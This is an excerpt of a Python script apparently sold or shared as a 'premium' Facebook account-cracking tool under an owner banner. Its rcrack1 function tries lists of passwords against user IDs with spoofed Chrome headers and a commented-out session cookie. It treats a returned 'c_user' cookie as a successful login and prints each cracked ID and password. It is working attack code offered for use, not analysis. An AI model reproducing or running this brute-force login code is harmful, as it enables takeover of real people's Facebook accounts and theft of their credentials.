...
\33[1;37m----------------------------------------------
\033[1;91m🩸 Owner      : GS GOJO SATURO
\033[1;91m🩸Facebook   :  GOJO SATURO
\033[1;91m🩸Github     :  GOJO 150
\033[1;91m🩸Tool Type  :  premium active
\033[1;91m🩸Version    :  0.1.1
\33[1;37m----------------------------------------------
""")                                              
...
class Main:
    ...
    def __init__(self):
        ...
        #os.system('espeak -a 200 "Weelcame "')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           # 'cookie': 'sb=Xq4iZonTrfV_leYf6nPacQet; datr=Xq4iZu2ozZ19Gkb2TVJOaDkd; ps_n=1; ps_l=1; locale=en_US; dpr=3.752533197402954; wd=685x1257; fr=0xfDlbIj9EYumAA8K.AWUKbgWTn1frpvXHyoPcCNwWBJo.BmIq5e..AAA.0.0.BmIrEx.AWVBC1tj0lI',
           'dpr': '2.625',
           'referer': 'https://web.facebook.com/?sk=welcome',
           'sec-ch-prefers-color-scheme': 'dark',
           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="123", "Google Chrome";v="123"',
           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="123.0.6322.216", "Google Chrome";v="123.0.6322.216"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-model': '""',
           ...
           'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6322.216 Safari/537.36',
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[XX-OK🩸] {uid} | {ps}")
        ...
        sys.stdout.write(f'\r\033[m[xx🩸] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
